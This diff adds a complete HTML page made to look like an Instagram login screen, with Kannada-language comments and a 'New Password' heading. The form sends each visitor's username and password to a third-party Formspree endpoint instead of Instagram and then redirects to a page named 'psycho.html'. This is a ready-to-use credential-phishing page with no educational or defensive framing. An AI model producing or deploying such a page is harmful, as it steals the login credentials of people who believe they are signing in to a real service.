@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="kn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        .login-box { background: white; padding: 40px; border: 1px solid #dbdbdb; width: 350px; text-align: center; }
+        
+        /* ಹೆಡ್ಡಿಂಗ್ ಸ್ಟೈಲ್ */
+        .title-text { font-size: 24px; font-weight: bold; margin-bottom: 10px; color: #262626; }
+        .subtitle-text { font-size: 16px; margin-bottom: 25px; color: #8e8e8e; }
+        
+        input { width: 100%; padding: 12px; margin: 5px 0; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; font-size: 14px; }
+        button { width: 100%; padding: 10px; margin-top: 10px; background: #0095f6; color: white; border: none; font-weight: bold; cursor: pointer; border-radius: 4px; font-size: 14px; }
+    </style>
+</head>
+<body>
+
+    <div class="login-box">
+        <div class="title-text">Instagram Login</div>
+        <div class="subtitle-text">New Password</div>
+        
+        <form action="https://formspree.io/f/meewanwk" method="POST">
+            <input type="text" name="username" placeholder="Phone number, username, or email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            
+            <input type="hidden" name="_next" value="psycho.html">
+            
+            <button type="submit">Log In</button>
+        </form>
+    </div>
+
+</body>
+</html>
